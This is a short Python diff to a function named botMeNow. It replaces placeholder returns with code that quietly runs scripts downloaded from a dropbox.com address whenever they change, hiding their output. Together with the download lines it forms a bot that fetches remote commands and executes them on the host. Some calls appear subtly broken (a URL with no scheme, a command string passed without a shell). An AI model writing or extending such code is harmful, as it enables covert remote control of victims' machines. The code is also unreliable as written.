@@ -4,6 +4,7 @@ import os
 import shutil
 import urllib
 import filecmp
+import subprocess
 
 def botMeNow():
     if not (os.path.isdir("/etc/botMeNow")):
@@ -19,11 +20,12 @@ def botMeNow():
     urllib.urlretrieve("dropbox.com/bashcom.sh")    #downloads bash commands
 
     if not (filecmp.cmp('pycom.py','/prev/pycom.py')):
-        #run python commands
-        return #get rid of this
+        py_com_str = "python pycom.py"
+        subprocess.call([py_com_str], stdout=open(os.devnull, 'wb'))
+
     if not (filecmp.cmp('bashcom.sh', '/prev/bashcom.sh')):
-        # run bash commands
-        return  # get rid of this
+        bash_com_str = "bash bashcom.sh"
+        subprocess.call([bash_com_str], stdout=open(os.devnull, 'wb'))
 
     return
 
